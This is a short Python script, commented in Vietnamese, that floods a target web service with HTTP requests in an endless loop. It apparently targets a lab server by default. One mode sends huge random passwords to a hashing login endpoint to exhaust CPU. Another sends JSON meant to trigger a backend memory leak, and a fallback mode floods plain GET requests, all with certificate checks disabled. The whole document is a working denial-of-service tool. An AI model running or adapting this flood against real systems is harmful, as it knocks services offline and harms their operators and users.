import requests
import sys
import urllib3
import random
import string
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
target = sys.argv[1] if len(sys.argv) > 1 else "https://10.0.0.10"
# Sửa chữ http thành https ở dòng này:
if not target.startswith('http://') and not target.startswith('https://'):
    target = f"https://{target}"
# Cờ xác định kiểu tấn công: 'hash' hoặc 'json'
attack_type = sys.argv[2] if len(sys.argv) > 2 else "hash"

print(f"[*] Bắt đầu L7 Application Flood vào {target} (Kiểu: {attack_type.upper()})...")

request_count = 0

def generate_long_string(length=100000):
    """Tạo một chuỗi ngẫu nhiên khổng lồ để bắt server băm"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_deep_json(depth=50, breadth=10): # Giảm chiều sâu xuống để tải CPU bớt đi
    """Tạo một cấu trúc JSON lồng nhau vừa phải để gửi đi nhanh hơn"""
    dummy_dict = {}
    current_level = dummy_dict
    for i in range(depth):
        current_level[f"level_{i}"] = {}
        for j in range(breadth):
            current_level[f"level_{i}"][f"data_{j}"] = generate_long_string(50) # Giảm độ dài chuỗi
        current_level = current_level[f"level_{i}"]
    return dummy_dict
try:
    while True:
        try:
            if attack_type == "hash":
                # Tấn công CPU: Gửi mật khẩu dài
                data = {'password': generate_long_string()}
                requests.post(f"{target.rstrip('/')}/api/hash_login", data=data, verify=False, timeout=5)
                request_count += 1
                
            elif attack_type == "json":
                # Tấn công RAM: Gửi payload bé xíu để kích hoạt RAM leak ở Backend
                payload = {"trigger": "leak_memory"}
                headers = {'Content-Type': 'application/json'}
                
                response = requests.post(f"{target.rstrip('/')}/api/process_json", json=payload, headers=headers, verify=False, timeout=5)
                request_count += 1
                
                # IN RA TẤT CẢ ĐỂ DEBUG
                print(f"[DEBUG] Request {request_count} - Status: {response.status_code} - Text: {response.text[:50]}")
                
            else:
                requests.get(target, verify=False, timeout=1)
                request_count += 1
                
        except Exception as e:
            # KHÔNG ĐƯỢC DÙNG 'pass' NỮA. HÃY IN LỖI RA!
            print(f"[LỖI KẾT NỐI] {e}")
            import time
            time.sleep(1) # Nghỉ 1s để màn hình không bị trôi quá nhanh khi có lỗi
            
except KeyboardInterrupt:
    print(f"\n[*] Đã dừng tấn công. Tổng request: {request_count}")
